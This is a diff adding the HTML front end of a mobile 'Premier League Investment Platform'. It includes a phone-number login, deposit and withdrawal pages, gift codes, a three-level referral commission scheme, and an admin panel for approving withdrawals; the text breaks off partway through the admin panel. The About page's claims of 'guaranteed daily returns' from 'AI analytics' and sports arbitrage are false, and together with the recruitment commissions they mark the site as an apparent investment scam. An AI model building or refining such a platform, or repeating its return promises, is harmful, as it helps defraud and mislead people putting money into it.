@@ -1,0 +1,2483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premier League Investment Platform</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+    
+    <style>
+        /* General Styling and Layout */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 450px;
+            width: 95%;
+            background-color: #fff;
+            min-height: 100vh;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        header {
+            background-color: #003366;
+            color: white;
+            padding: 15px 20px;
+            text-align: center;
+            font-size: 1.2em;
+            font-weight: bold;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        /* Navigation Bar */
+        .navbar {
+            display: flex;
+            justify-content: space-around;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            max-width: 450px;
+            background-color: #003366;
+            border-top: 1px solid #ddd;
+            z-index: 1000;
+        }
+
+        .nav-item {
+            flex-grow: 1;
+            text-align: center;
+            padding: 10px 0;
+            cursor: pointer;
+            color: #ccc;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .nav-item.active {
+            color: #FFC300;
+            background-color: #004080;
+        }
+
+        .nav-item i {
+            font-size: 1.2em;
+            display: block;
+            margin-bottom: 3px;
+        }
+        
+        .content {
+            padding: 15px 15px 80px 15px;
+        }
+
+        .page-section {
+            display: none;
+        }
+        
+        /* --- Auth Overlay Styling --- */
+        .auth-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            background-image: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://upload.wikimedia.org/wikipedia/en/thumb/b/be/Flag_of_England.svg/1200px-Flag_of_England.svg.png');
+            background-size: cover;
+            background-position: center;
+        }
+        
+        .auth-box {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            max-width: 350px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .input-group {
+            display: flex;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .input-group span {
+            background-color: #eee;
+            padding: 12px;
+            font-weight: bold;
+            color: #555;
+            white-space: nowrap;
+        }
+
+        .auth-box input {
+            flex-grow: 1;
+            padding: 12px;
+            border: none;
+            box-sizing: border-box;
+        }
+
+        .auth-box button {
+            width: 100%;
+            padding: 12px;
+            background-color: #FFC300;
+            color: #003366;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1.1em;
+            font-weight: bold;
+            margin-top: 15px;
+            transition: background-color 0.3s;
+        }
+        
+        #message {
+            margin: 10px 0;
+            color: red;
+            font-weight: bold;
+        }
+
+        /* --- Home Page Specific Styles --- */
+        
+        .function-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr); 
+            gap: 10px;
+            background: white;
+            padding: 20px 10px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border: 1px solid #eee;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+        
+        /* 3 Columns for Home Page */
+        .home-grid-layout {
+            grid-template-columns: repeat(3, 1fr) !important; 
+        }
+
+        .function-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            cursor: pointer;
+            text-align: center;
+        }
+        .function-item:active { transform: scale(0.95); }
+        .function-item i {
+            font-size: 1.3em;
+            margin-bottom: 8px;
+            color: white;
+            width: 45px;
+            height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 12px;
+            box-shadow: 0 3px 6px rgba(0,0,0,0.1);
+        }
+        .function-item span { font-size: 0.8em; color: #333; font-weight: bold; white-space: nowrap; }
+
+        .balance-box {
+            background-color: #003366;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        .balance-label { font-size: 1em; opacity: 0.8; }
+        .balance-value { font-size: 1.8em; font-weight: bold; color: #FFC300; }
+        
+        /* --- GRID LAYOUT FOR INVESTMENTS (GON LEGON) --- */
+        #investmentPlansContainer {
+            display: grid;
+            grid-template-columns: 1fr 1fr; /* 2 Columns */
+            gap: 10px;
+        }
+
+        .investment-card { 
+            background-color: #fff; 
+            border: 1px solid #ddd; 
+            border-radius: 10px; 
+            padding: 10px; 
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05); 
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        
+        .team-logo-container {
+            width: 100%;
+            height: 70px; /* Smaller height for grid */
+            margin: 0 auto 10px auto; 
+            overflow: hidden; 
+            border-radius: 5px; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .team-logo-container img { width: 100%; height: 100%; object-fit: contain; }
+        
+        .team-name { 
+            font-size: 1.1em; font-weight: bold; color: #003366; 
+            margin-bottom: 10px; padding-bottom: 5px; border-bottom: 1px solid #eee;
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+        }
+        
+        .card-details { text-align: left; padding: 0 5px; font-size: 0.85em; }
+        
+        /* Adjusted details for 2-column view */
+        .card-details p { margin: 5px 0; display: flex; justify-content: space-between; align-items: center; }
+        .detail-label { font-weight: bold; color: #666; width: auto; font-size: 0.9em; } 
+        .detail-value { font-weight: bold; color: #333; font-size: 0.95em; }
+        
+        .action-btn { 
+            padding: 10px; 
+            border: none; 
+            border-radius: 6px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            display: block; 
+            width: 100%;
+            text-align: center;
+            font-size: 0.9em;
+            margin-top: 10px;
+            color: white;
+            transition: transform 0.1s;
+        }
+        .action-btn:active { transform: scale(0.98); }
+        .action-btn.deposit { background-color: #4CAF50; } 
+        /* ---------------------------------------------------- */
+        
+        .total-income-box { background-color: #e8f5e9; padding: 20px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
+        .total-income-value { font-size: 2em; font-weight: bold; color: #388E3C; }
+        
+        .active-investment-card {
+            border: 1px solid #ddd; padding: 15px; margin-bottom: 15px; border-radius: 8px;
+            background-color: #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+        .active-investment-card .claim-btn {
+            padding: 10px; margin-top: 10px; width: 100%; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; transition: background-color 0.3s;
+        }
+        .claim-btn.ready { background-color: #4CAF50; color: white; }
+        .claim-btn.disabled { background-color: #ccc; color: #666; cursor: not-allowed; }
+
+        .referral-box {
+            background-color: #e0f7fa; padding: 20px; border-radius: 8px; text-align: center; margin-bottom: 25px; border: 1px solid #b2ebf2;
+        }
+        .referral-code-area {
+            background-color: #fff; padding: 10px; border-radius: 5px; margin-top: 10px;
+            display: flex; justify-content: space-between; align-items: center; border: 1px dashed #00838f;
+        }
+        .referral-code-area span { font-family: monospace; font-size: 0.9em; color: #006064; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .copy-btn { background-color: #00838f; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; margin-left: 5px; }
+
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .stat-card { background-color: white; padding: 12px; border-radius: 8px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #eee; display: flex; flex-direction: column; justify-content: center; }
+        .stat-value { font-size: 1.3em; font-weight: bold; color: #003366; margin-bottom: 3px; }
+        .stat-label { font-size: 0.8em; color: #666; }
+        
+        .clickable-card { cursor: pointer; transition: transform 0.2s, background-color 0.2s; border: 1px solid #b3e5fc; background-color: #f0f8ff; }
+        .clickable-card:active { transform: scale(0.95); background-color: #e1f5fe; }
+
+        .history-item { padding: 10px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; font-size: 0.9em; }
+        .history-item:last-child { border-bottom: none; }
+        .history-type { font-weight: bold; width: 100px; }
+        .history-amount.credit { color: green; }
+        .history-amount.debit { color: red; }
+        .history-date { font-size: 0.8em; color: #777; }
+
+        #homePage h3 { position: relative; padding-left: 75px; line-height: 40px; color: #003366; margin-bottom: 20px; }
+        #homePage h3::before {
+            content: ""; position: absolute; left: 0; top: 50%; transform: translateY(-50%); width: 40px; height: 40px;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Flag_of_the_United_Kingdom.svg/640px-Flag_of_the_United_Kingdom.svg.png'); 
+            background-size: cover; background-position: center; border: 1px solid #ccc; border-radius: 5px;
+        }
+        
+        .slideshow-container {
+            height: 180px; margin-bottom: 20px; overflow: hidden; position: relative; border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); background-color: #003366; display: flex; justify-content: center; align-items: center;
+        }
+        
+        #slideshowImage, #incomeSlideshowImage { width: 100%; height: 100%; object-fit: cover; transition: opacity 1s ease-in-out; }
+        
+        .modal {
+            display: none; position: fixed; z-index: 3000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.7); 
+        }
+        .modal-content {
+            background-color: #fefefe; margin: 15% auto; padding: 20px; border: 1px solid #888;
+            width: 90%; max-width: 350px; border-radius: 10px; position: relative; box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            max-height: 80vh; overflow-y: auto; 
+        }
+        .modal-content input, .modal-content select {
+            width: 100%; padding: 10px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;
+        }
+        .modal-content button {
+            width: 100%; padding: 10px; margin-top: 10px; background-color: #003366; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;
+        }
+        .modal-content button.next-step { background-color: #4CAF50; }
+        .modal-content .close-btn { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
+
+        .payment-option {
+            border: 1px solid #ddd; padding: 10px; margin: 5px 0; border-radius: 5px; cursor: pointer; display: flex; align-items: center; transition: background-color 0.2s;
+        }
+        .payment-option.selected { background-color: #e6f7ff; border-color: #003366; font-weight: bold; }
+        .payment-info { background-color: #f9f9f9; padding: 10px; border: 1px solid #eee; border-radius: 5px; margin-top: 10px; }
+        .copy-acc-btn {
+            padding: 5px 10px; background-color: #003366; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 0.8em; margin-left: 10px;
+        }
+        .copy-acc-btn:active { transform: scale(0.95); }
+        
+        .photo-thumbnail {
+            width: 50px; height: 50px; display: inline-flex; justify-content: center; align-items: center; margin: 5px; border-radius: 5px; cursor: pointer; border: 2px solid transparent; transition: border 0.2s; overflow: hidden; background-color: #eee;
+        }
+        .photo-thumbnail img { width: 100%; height: 100%; object-fit: contain; }
+        .photo-thumbnail.selected { border: 2px solid #FFC300; }
+        
+        .plan-item, .deposit-request-item, .withdrawal-request-item {
+            display: flex; justify-content: space-between; align-items: center; padding: 10px; margin-bottom: 8px; border: 1px solid #ddd; border-radius: 5px; flex-wrap: wrap; 
+        }
+        .request-info { flex-basis: 70%; font-size: 0.9em; }
+        .request-actions { flex-basis: 30%; text-align: right; }
+        .plan-actions button, .request-actions button {
+            margin-left: 5px; padding: 5px 10px; cursor: pointer; border: none; border-radius: 3px; color: white; font-size: 0.8em; margin-bottom: 2px;
+        }
+        .edit-btn { background-color: #FFC300; color: #003366 !important; }
+        .delete-btn { background-color: #f44336; }
+        .approve-btn { background-color: #4CAF50; }
+        .reject-btn { background-color: #f44336; }
+
+        .admin-section { margin-bottom: 20px; padding: 15px; border: 1px solid #ccc; border-radius: 8px; }
+        .admin-section input { width: 100%; padding: 10px; margin: 5px 0; box-sizing: border-box; border: 1px solid #ccc; border-radius: 5px; }
+        
+        .code-display {
+            background-color: #eee;
+            padding: 10px;
+            font-family: monospace;
+            font-weight: bold;
+            color: #003366;
+            border-radius: 5px;
+            margin-top: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        /* ME PAGE STYLES */
+        .management-options { margin-top: 10px; background: white; border-radius: 8px; overflow: hidden; border: 1px solid #eee; }
+        .option-item { padding: 15px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
+        .option-item:last-child { border-bottom: none; }
+        .option-item:active { background-color: #f5f5f5; }
+        .account-summary { background-color: #fff; padding: 20px; border-radius: 8px; text-align: center; border: 1px solid #ddd; }
+        .summary-label { color: #777; font-size: 0.9em; margin-bottom: 5px; }
+        .summary-value { font-size: 2em; font-weight: bold; color: #003366; }
+        .logout-btn { width: 100%; padding: 12px; margin-top: 20px; background-color: #85120a7a; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+
+        /* PROFILE PICTURE STYLES */
+        .profile-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .profile-img-box {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 3px solid #FFC300;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            position: relative;
+            background-color: #eee;
+        }
+        .profile-img-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .edit-profile-btn {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            background-color: #003366;
+            color: white;
+            border-radius: 50%;
+            width: 25px;
+            height: 25px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            border: 2px solid white;
+            font-size: 0.8em;
+        }
+
+        /* History Tabs */
+        .history-tabs {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 10px;
+        }
+        .tab-btn {
+            background: none;
+            border: none;
+            padding: 8px 5px;
+            font-weight: bold;
+            color: #777;
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+            margin-top: 0 !important; /* Override general button style */
+            width: auto !important; /* Override general button style */
+        }
+        .tab-btn.active {
+            color: #003366;
+            border-bottom-color: #FFC300;
+        }
+
+        /* About Page Styles */
+        .about-header { font-size: 1.5em; font-weight: bold; color: #003366; margin-bottom: 15px; border-bottom: 2px solid #FFC300; padding-bottom: 10px; display: inline-block; }
+        .about-text { font-size: 1em; line-height: 1.6; color: #444; margin-bottom: 20px; text-align: justify; }
+        .feature-list { list-style: none; padding: 0; }
+        .feature-list li { margin-bottom: 12px; display: flex; align-items: flex-start; }
+        .feature-list i { color: #FFC300; margin-right: 10px; margin-top: 4px; background: #003366; padding: 5px; border-radius: 50%; font-size: 0.8em; }
+
+        /* --- STYLES FOR RECORD SECTION (In Modal) --- */
+        .record-list {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .record-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 5px;
+            border-bottom: 1px solid #eee;
+            font-size: 0.95em;
+        }
+        .record-item:last-child {
+            border-bottom: none;
+        }
+        .record-user {
+            display: flex;
+            align-items: center;
+            color: #333;
+            font-weight: bold;
+        }
+        .record-user i {
+            margin-right: 8px;
+            color: #003366;
+            font-size: 1.2em;
+        }
+        .record-amount {
+            font-weight: bold;
+            color: #388E3C;
+            font-size: 1.1em;
+        }
+        .record-date {
+            font-size: 0.8em;
+            color: #888;
+            margin-top: 3px;
+            display: block;
+            text-align: right;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="auth-overlay" id="authOverlay">
+        <div class="auth-box">
+            <h2 id="authTitle">Login</h2>
+            <p id="message"></p>
+            <form id="authForm">
+                <div class="input-group">
+                    <span>+251</span>
+                    <input type="number" id="authPhoneNumber" placeholder="Phone Number (9XXXXXXXX)" required>
+                </div>
+                <input type="password" id="authPassword" placeholder="Password" required>
+                <input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;">
+                <input type="text" id="authReferralCode" placeholder="Referral Code (Optional)" style="display:none;">
+                <button type="submit" id="authButton">Login</button>
+            </form>
+            <div class="auth-switch">
+                <span id="authSwitchText">Don't have an account? </span>
+                <a href="#" onclick="toggleAuthMode(); return false;">Register Now</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container" id="mainApp" style="display:none;">
+        <header id="appHeader">Investment Platform</header>
+
+        <div class="content">
+            
+            <div class="page-section" id="homePage" style="display: block;">
+                <div class="slideshow-container">
+                    <img id="slideshowImage" src="https://images.pexels.com/photos/270085/pexels-photo-270085.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Slideshow Image">
+                </div>
+                <div class="balance-box">
+                    <span class="balance-label">Current Balance</span>
+                    <span class="balance-value">$<span id="currentBalanceHome">0.00</span></span>
+                </div>
+                
+                <div class="function-grid home-grid-layout">
+                    <div class="function-item" onclick="openDepositModal()">
+                        <i class="fas fa-arrow-down" style="background-color: #166303;"></i>
+                        <span>Deposit</span>
+                    </div>
+                    <div class="function-item" onclick="openWithdrawModal()">
+                        <i class="fas fa-arrow-up" style="background-color: #d32f2f;"></i>
+                        <span>Withdraw</span>
+                    </div>
+                    <div class="function-item" onclick="openGiftModal()">
+                        <i class="fas fa-gift" style="background-color: #E91E63;"></i>
+                        <span>Gift Code</span>
+                    </div>
+                    <div class="function-item" onclick="window.open('https://t.me/Host_Farming', '_blank')">
+                        <i class="fab fa-telegram-plane" style="background-color: #0088CC;"></i>
+                        <span>Channel</span>
+                    </div>
+                    <div class="function-item" onclick="window.open('https://t.me/John_customer_care', '_blank')">
+                        <i class="fas fa-headset" style="background-color: #003366;"></i>
+                        <span>Support</span>
+                    </div>
+                    <div class="function-item" onclick="openRecordsModal()">
+                        <i class="fas fa-file-invoice" style="background-color: #795548;"></i>
+                        <span>Records</span>
+                    </div>
+                </div>
+
+                <h3>Available Investment Plans</h3>
+                <div id="investmentPlansContainer">
+                    <p>Loading plans...</p>
+                </div>
+            </div>
+            
+            <div class="page-section" id="incomePage">
+                <div class="slideshow-container">
+                    <img id="incomeSlideshowImage" src="https://images.pexels.com/photos/164527/pexels-photo-164527.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1" alt="Income Slideshow">
+                </div>
+                
+                <div class="total-income-box">
+                    <h3>Total Income</h3>
+                    <div class="total-income-value">$<span id="totalIncome">0.00</span></div>
+                    <p>Total daily profit earned.</p>
+                </div>
+                <h3>My Active Investments</h3>
+                <div id="activeInvestmentsList">
+                    <p>No active investments found. Buy a plan from the Home page.</p>
+                </div>
+            </div>
+
+            <div class="page-section" id="teamPage">
+                <div class="referral-box">
+                    <h3>My Referral Info</h3>
+                    <p>Code: <strong style="color: #003366; font-size: 1.2em;"><span id="displayReferralCode">LOADING...</span></strong></p>
+                    <div class="referral-code-area">
+                        <span id="referralLink">LOADING...</span>
+                        <button class="copy-btn" onclick="copyReferralLink()"><i class="fas fa-copy"></i> Copy</button>
+                    </div>
+                </div>
+
+                <div style="background-color: #fff8e1; border: 1px solid #ffe0b2; padding: 15px; border-radius: 8px; margin-bottom: 20px; color: #011658; font-size: 0.95em;">
+                    <h4 style="margin: 0 0 10px 0; display: flex; align-items: center;"><i class="fas fa-gift" style="margin-right: 8px;"></i> Commission Rules</h4>
+                    <ul style="margin: 0; padding-left: 20px; line-height: 1.6;">
+                        <li><strong>First Deposit Bonus:</strong> Get <span style="color: #0c0e63; font-weight: bold;">10%</span> instantly when your direct referral invests for the first time.</li>
+                        <li><strong>Daily Team Commission:</strong>
+                            <ul style="margin-top: 5px;">
+                                <li>Level 1: <strong>8%</strong> of daily profit</li>
+                                <li>Level 2: <strong>3%</strong> of daily profit</li>
+                                <li>Level 3: <strong>1%</strong> of daily profit</li>
+                            </ul>
+                        </li>
+                    </ul>
+                </div>
+
+                <h3>Team Statistics</h3>
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-value" id="statTotalInvited">0</div>
+                        <div class="stat-label">Total Invited Users</div>
+                    </div>
+                    <div class="stat-card clickable-card" onclick="openTeamDetailsModal()">
+                        <div class="stat-value" id="statActiveInvestors">0</div>
+                        <div class="stat-label">Total Investing Users <i class="fas fa-eye" style="font-size: 0.8em; margin-left: 5px;"></i></div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="statTeamInvestment">$0.00</div>
+                        <div class="stat-label">Team Total Volume</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="statTotalCommission" style="color: #388E3C;">$0.00</div>
+                        <div class="stat-label">Total Commission</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="page-section" id="mePage">
+                <div class="profile-container">
+                    <div class="profile-img-box" onclick="openProfileModal()">
+                        <img id="userProfilePic" src="https://cdn-icons-png.flaticon.com/512/149/149071.png" alt="Profile">
+                        <div class="edit-profile-btn"><i class="fas fa-camera"></i></div>
+                    </div>
+                </div>
+
+                <div class="account-summary">
+                    <p id="currentUserPhone" class="summary-label"></p>
+                    <div class="summary-item">
+                        <div class="summary-label">Current Balance</div>
+                        <div class="summary-value">$<span id="currentBalanceMe">0.00</span></div> 
+                    </div>
+                </div>
+
+                <div class="stats-grid" style="margin-top: 15px;">
+                     <div class="stat-card">
+                        <div class="stat-value">$<span id="meTotalRecharge">0.00</span></div>
+                        <div class="stat-label">Total Recharge</div>
+                     </div>
+                     <div class="stat-card">
+                        <div class="stat-value">$<span id="meTotalWithdraw">0.00</span></div>
+                        <div class="stat-label">Total Withdraw</div>
+                     </div>
+                     <div class="stat-card">
+                        <div class="stat-value">$<span id="meTotalInvestment">0.00</span></div>
+                        <div class="stat-label">Total Investment</div>
+                     </div>
+                     <div class="stat-card">
+                        <div class="stat-value" style="color: #388E3C;">$<span id="meTotalIncome">0.00</span></div>
+                        <div class="stat-label">Total Income</div>
+                     </div>
+                </div>
+                
+                <div class="function-grid" style="grid-template-columns: repeat(3, 1fr);">
+                    <div class="function-item" onclick="openDepositModal()">
+                        <i class="fas fa-arrow-down" style="background-color: #4CAF50;"></i>
+                        <span>Deposit</span>
+                    </div>
+                    <div class="function-item" onclick="openWithdrawModal()">
+                        <i class="fas fa-arrow-up" style="background-color: #f44336;"></i>
+                        <span>Withdraw</span>
+                    </div>
+                    <div class="function-item" onclick="openBindBankModal()">
+                        <i class="fas fa-university" style="background-color: #E91E63;"></i>
+                        <span>Bind Card</span>
+                    </div>
+                    <div class="function-item" onclick="openHistoryPage()">
+                        <i class="fas fa-file-invoice-dollar" style="background-color: #2196F3;"></i>
+                        <span>History</span>
+                    </div>
+                    <div class="function-item" onclick="openChangePasswordModal()">
+                        <i class="fas fa-lock" style="background-color: #FFC300; color: #003366;"></i>
+                        <span>Security</span>
+                    </div>
+                    <div class="function-item" onclick="openAboutPage()">
+                        <i class="fas fa-info-circle" style="background-color: #607d8b;"></i>
+                        <span>About</span>
+                    </div>
+                </div>
+
+                <h3 style="margin-top: 20px;">Support</h3>
+                <div class="management-options">
+                    <div class="option-item" onclick="window.open('https://t.me/Host_Farming', '_blank')">
+                        <span><i class="fab fa-telegram-plane" style="color: #0088CC; margin-right: 10px;"></i>Telegram Channel</span>
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
+                    <div class="option-item" onclick="window.open('https://t.me/John_customer_care', '_blank')">
+                        <span><i class="fas fa-headset" style="color: #003366; margin-right: 10px;"></i>Customer Service</span>
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
+                    <div class="option-item" onclick="alert('Application is under development. Please stick to the website for now!')">
+                        <span><i class="fas fa-download" style="color: #4CAF50; margin-right: 10px;"></i>Download App</span>
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
+                </div>
+                <button class="logout-btn" onclick="logout()">Logout</button>
+            </div>
+            
+            <div class="page-section" id="aboutPage" style="display: none; background-color: #f9f9f9; padding: 0;">
+                <div style="background-color: #003366; color: white; padding: 15px 20px; display: flex; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
+                    <i class="fas fa-arrow-left" onclick="closeAboutPage()" style="cursor: pointer; font-size: 1.2em; margin-right: 15px;"></i>
+                    <span style="font-size: 1.2em; font-weight: bold;">About Platform</span>
+                </div>
+                <div style="padding: 20px;">
+                    <h2 class="about-header">Premier League Investment</h2>
+                    <p class="about-text">
+                        Welcome to the world's leading sports finance ecosystem. Our platform bridges the gap between passionate football fans and high-yield financial opportunities. By leveraging the massive economy of the English Premier League, we offer sustainable and profitable investment plans.
+                    </p>
+                    <p class="about-text">
+                        Our system utilizes advanced AI analytics to optimize profit generation through sports arbitrage, sponsorship revenue sharing, and ticket sales data. This ensures that every investment plan you purchase generates a guaranteed daily income.
+                    </p>
+                    
+                    <h3 style="color: #003366; margin-top: 25px;">Why Choose Us?</h3>
+                    <ul class="feature-list">
+                        <li><i class="fas fa-check"></i> <strong>Guaranteed Daily Returns:</strong> Stable income credited to your account every 24 hours.</li>
+                        <li><i class="fas fa-check"></i> <strong>Secure Transactions:</strong> Integration with major local banks (CBE, Telebirr, etc.) for fast and safe deposits/withdrawals.</li>
+                        <li><i class="fas fa-check"></i> <strong>Team Commission:</strong> Earn up to 3 levels of commission (8%, 3%, 1%) by building your own team.</li>
+                        <li><i class="fas fa-check"></i> <strong>24/7 Support:</strong> Dedicated customer service to assist you at any time.</li>
+                    </ul>
+                    
+                    <div style="background-color: #e3f2fd; padding: 15px; border-radius: 8px; margin-top: 25px; border-left: 5px solid #2196F3;">
+                        <p style="margin: 0; font-size: 0.9em; color: #0d47a1;">
+                            <strong>Our Mission:</strong> To provide financial freedom to our community through transparent and profitable sports investment opportunities.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="page-section" id="historyPage" style="display: none; background-color: #f9f9f9; padding: 0;">
+                <div style="background-color: #003366; color: white; padding: 15px 20px; display: flex; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 500;">
+                    <i class="fas fa-arrow-left" onclick="closeHistoryPage()" style="cursor: pointer; font-size: 1.2em; margin-right: 15px;"></i>
+                    <span style="font-size: 1.2em; font-weight: bold;">Transaction History</span>
+                </div>
+                <div style="padding: 15px;">
+                    <div class="history-tabs">
+                        <button class="tab-btn active" onclick="filterHistory('All')">All</button>
+                        <button class="tab-btn" onclick="filterHistory('Deposit')">Deposit</button>
+                        <button class="tab-btn" onclick="filterHistory('Withdraw')">Withdraw</button>
+                        <button class="tab-btn" onclick="filterHistory('Income')">Income</button>
+                    </div>
+        
+                    <div id="historyList">
+                        <p>Loading transactions...</p>
+                    </div>
+                </div>
+            </div>
+
+        </div> <div class="navbar">
+            <div class="nav-item active" data-page="homePage">
+                <i class="fas fa-landmark"></i>
+                <span>Home</span>
+            </div>
+            <div class="nav-item" data-page="incomePage">
+                <i class="fas fa-trophy"></i>
+                <span>Income</span>
+            </div>
+            <div class="nav-item" data-page="teamPage">
+                <i class="fas fa-sitemap"></i>
+                <span>Team</span>
+            </div>
+            <div class="nav-item" data-page="mePage">
+                <i class="fas fa-user"></i>
+                <span>Me</span>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container" id="adminPanel" style="display:none;">
+        <header>Admin Panel - Control Center</header>
+        <div class="content">
+            <div class="admin-section">
+                <h2>Deposit Approval Queue</h2>
+                <div id="depositRequestsList">
+                    <p>No pending deposit requests.</p>
+                </div>
+            </div>
+            
+            <div class="admin-section">
+                <h2>Withdrawal Approval Queue</h2>
+                <div id="withdrawalRequestsList">
+                    <p>No pending withdrawal requests.</p>
+                </div>
+            </div>
+            
+            <div class="admin-section">
+                <h2>Create Gift Code</h2>
+                <p style="font-size:0.9em; color:#555;">Generate a code for users to redeem balance.</p>
+                
+                <div style="display: flex; gap: 10px;">
+                    <input type="number" id="giftCodeAmount" placeholder="Amount ($)" required style="flex:1;">
+                    <input type="number" id="giftCodeMinutes" placeholder="Expire in (Minutes)" required style="flex:1;">
+                </div>
+                
+                <button onclick="generateGiftCode()" style="background-color: #E91E63; margin-bottom: 15px;">Generate Code</button>
+                <h3>Active Codes</h3>
+                <div id="activeGiftCodesList">
+                    <p>Loading...</p>
+                </div>
+            </div>
+
+            <div class="admin-section">
+                <h2>Manage Existing Plans</h2>
+                <div id="existingPlansList">
+                    <p>Loading existing plans...</p>
+                </div>
+            </div>
+            <div class="admin-section">
+                <h2>Create New Investment Plan</h2>
+                <label>Select Team Logo:</label>
+                <div id="logoSelectionArea" style="margin-bottom: 15px;">
+                    <div class="photo-thumbnail" data-logo="https://upload.wikimedia.org/wikipedia/en/5/53/Arsenal_FC.svg" onclick="selectLogo(this)"><img src="https://upload.wikimedia.org/wikipedia/en/5/53/Arsenal_FC.svg" alt="ARS" onerror="this.src='https://via.placeholder.com/50?text=ARS'"></div>
+                    <div class="photo-thumbnail" data-logo="https://upload.wikimedia.org/wikipedia/en/7/7a/Manchester_United_FC_crest.svg" onclick="selectLogo(this)"><img src="https://upload.wikimedia.org/wikipedia/en/7/7a/Manchester_United_FC_crest.svg" alt="MU" onerror="this.src='https://via.placeholder.com/50?text=MU'"></div>
